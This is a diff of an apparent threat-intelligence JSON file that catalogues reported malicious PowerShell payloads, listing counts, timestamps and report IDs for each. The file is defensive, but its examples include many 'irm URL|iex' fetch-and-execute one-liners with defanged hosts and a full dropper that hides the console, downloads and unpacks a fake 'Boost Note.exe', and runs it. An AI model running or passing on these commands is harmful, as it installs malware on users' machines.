@@ -1,20 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 162,
-    "ReportCount": 162,
-    "FirstSeen": "2026-11-12T23:25:23.097000+00:00",
-    "LastSeen": "2026-11-19T18:53:30.900000+00:00",
+    "DistinctPayloadCount": 155,
+    "ReportCount": 155,
+    "FirstSeen": "2026-11-13T01:23:24.624000+00:00",
+    "LastSeen": "2026-11-19T23:26:13.464000+00:00",
     "ReportIds": [
-      "cmwe6egab07r40omlaykrxwjj",
-      "cmwe6ekob07rq0oml58sh6rrw",
-      "cmwe6fcn507sm0oml7vikiuxv",
-      "cmwe6fee907sw0omlo51w7jwd",
-      "cmwe6fyao07uc0omlffcs2zxu",
-      "cmwe6g6ux07v90omlmjyd5njj",
-      "cmwe6gq1a07wf0oml6ikm3qdf",
-      "cmwe6gq6107wg0omlybspancs",
-      "cmwe6hbwc07yn0omlw3oayuj0",
       "cmweam8mu0bq30oml9mwud97d",
       "cmweam9ea0bq60omlc6wn3tdt",
       "cmwean10w0btt0omla09v8y3l",
@@ -167,7 +158,9 @@
       "cmwng9yaz1weo0omlil8hkqpe",
       "cmwngai5s1wfr0omlh7jmz11d",
       "cmwnii4tr1wvc0oml2fy1ka38",
-      "cmwnwrsgu1xi10omlj9jbvrk0"
+      "cmwnwrsgu1xi10omlj9jbvrk0",
+      "cmwo69tad1xsb0omltg23i5hb",
+      "cmwo6iht31y350omldf1s1y9c"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/03b93fa50e7a9f43'|iex;",
@@ -188,8 +181,6 @@
       "irm 'browse-cloud.codes/2564bd608a5f29ab'|iex;",
       "irm 'browse-cloud.codes/29bb21c61e7113d6'|iex;",
       "irm 'browse-cloud.codes/2e1afda887033c57'|iex;",
-      "irm 'browse-cloud.codes/30a71a2fdd245a54'|iex;",
-      "irm 'browse-cloud.codes/32e494b8378e3441'|iex;",
       "irm 'browse-cloud.codes/336728d213008c22'|iex;",
       "irm 'browse-cloud.codes/336859a88717c5ae'|iex;",
       "irm 'browse-cloud.codes/3426c2223ed9c3e8'|iex;",
@@ -199,14 +190,12 @@
       "irm 'browse-cloud.codes/3b1e84a691f0e630'|iex;",
       "irm 'browse-cloud.codes/3d88e2e0aa08ee9b'|iex;",
       "irm 'browse-cloud.codes/3ecc4f43c6e077c1'|iex;",
-      "irm 'browse-cloud.codes/404f8b939dce2afe'|iex;",
       "irm 'browse-cloud.codes/410de3376b3684a0'|iex;",
       "irm 'browse-cloud.codes/416c86d35c45adea'|iex;",
       "irm 'browse-cloud.codes/4280699ca08aac34'|iex;",
       "irm 'browse-cloud.codes/4336759c1767431e'|iex;",
       "irm 'browse-cloud.codes/43a0d34caa1bd616'|iex;",
       "irm 'browse-cloud.codes/4a7b2df0db2c494c'|iex;",
-      "irm 'browse-cloud.codes/4b7ddb4fc39a9ff3'|iex;",
       "irm 'browse-cloud.codes/4c1b1a1b8058ca47'|iex;",
       "irm 'browse-cloud.codes/4c28381cf3d3eaa0'|iex;",
       "irm 'browse-cloud.codes/4d72762f0a2f414d'|iex;",
@@ -223,8 +212,6 @@
       "irm 'browse-cloud.codes/5ec9a9678de2ef32'|iex;",
       "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
       "irm 'browse-cloud.codes/6212895d940eee1b'|iex;",
-      "irm 'browse-cloud.codes/62f2ca8cc1e23e58'|iex;",
-      "irm 'browse-cloud.codes/63534eff5860c270'|iex;",
       "irm 'browse-cloud.codes/65ba5e5cabdf023c'|iex;",
       "irm 'browse-cloud.codes/66e3f1b391f2996a'|iex;",
       "irm 'browse-cloud.codes/688f43a4c4e6a9ce'|iex;",
@@ -244,7 +231,6 @@
       "irm 'browse-cloud.codes/84afd8114832f24a'|iex;",
       "irm 'browse-cloud.codes/85e8889097dc6cfd'|iex;",
       "irm 'browse-cloud.codes/8751569bda6b597f'|iex;",
-      "irm 'browse-cloud.codes/875877f7d9ba3a9c'|iex;",
       "irm 'browse-cloud.codes/89a49087ccc3f0d3'|iex;",
       "irm 'browse-cloud.codes/8c6bd87a35d97727'|iex;",
       "irm 'browse-cloud.codes/8ee2e4aa1b2fe006'|iex;",
@@ -300,9 +286,7 @@
       "irm 'browse-cloud.codes/d873e706d92fc221'|iex;",
       "irm 'browse-cloud.codes/d92cc57d903126ca'|iex;",
       "irm 'browse-cloud.codes/deb16e74de52341f'|iex;",
-      "irm 'browse-cloud.codes/df566b6947c2c0cc'|iex;",
       "irm 'browse-cloud.codes/df805a6fac02c376'|iex;",
-      "irm 'browse-cloud.codes/e0d5e1e484132468'|iex;",
       "irm 'browse-cloud.codes/e0f86137ef78e8ec'|iex;",
       "irm 'browse-cloud.codes/e1869d542b246dfd'|iex;",
       "irm 'browse-cloud.codes/e1b66155c1796380'|iex;",
@@ -327,8 +311,10 @@
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
       "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;",
+      "irm 'img-codes-cloude[.]info/0253250b2b50c7ff'|iex;",
       "irm 'img-codes-cloude[.]info/4bcc3365f865c038'|iex;",
       "irm 'img-codes-cloude[.]info/4dacdbba3b1cb474'|iex;",
+      "irm 'img-codes-cloude[.]info/4e816a63fc53eaa4'|iex;",
       "irm 'img-codes-cloude[.]info/621993c387443d46'|iex;",
       "irm 'img-codes-cloude[.]info/733cc39bf1b16194'|iex;",
       "irm 'img-codes-cloude[.]info/bdcfda63ea50bf2e'|iex;"
@@ -336,10 +322,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 92,
-    "ReportCount": 92,
+    "DistinctPayloadCount": 93,
+    "ReportCount": 93,
     "FirstSeen": "2026-11-12T23:50:17.931000+00:00",
-    "LastSeen": "2026-11-19T13:43:35.418000+00:00",
+    "LastSeen": "2026-11-19T23:19:43.828000+00:00",
     "ReportIds": [
       "cmwe7ahpk081t0oml3caic0vl",
       "cmwe7b7wf082h0omlg6jyyk5k",
@@ -432,7 +418,8 @@
       "cmwndcg261w1d0oml4mnk1sjd",
       "cmwnhlqw11wtv0omlgny6ppm6",
       "cmwnlotyh1wyr0omlqyh8e3xl",
-      "cmwnlp7zj1wzj0omlkec6jirx"
+      "cmwnlp7zj1wzj0omlkec6jirx",
+      "cmwo6a5551xu40omla5b849lo"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -525,6 +512,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f8dec8b4b16293e1')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/online/e22c82da8905db58')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/online/ec2a5899511dfa69')|iex"
     ]
@@ -814,9 +802,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 43,
+    "ReportCount": 44,
     "FirstSeen": "2026-11-12T23:49:53.136000+00:00",
-    "LastSeen": "2026-11-18T16:48:42.514000+00:00",
+    "LastSeen": "2026-11-19T23:20:44.145000+00:00",
     "ReportIds": [
       "cmwe79ylx08080oml5k4dzonu",
       "cmwe7a1hu080y0omlm1sm6qb3",
@@ -860,7 +848,8 @@
       "cmwlzsh9q1r0l0oml4gpgxjes",
       "cmwlzw5oa1r2p0omliz6xurp7",
       "cmwm4ipde1sbg0omlmv080a4m",
-      "cmwmcvfn81snn0oml5h11ww14"
+      "cmwmcvfn81snn0oml5h11ww14",
+      "cmwo6bfpc1xut0omlmuild5t3"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
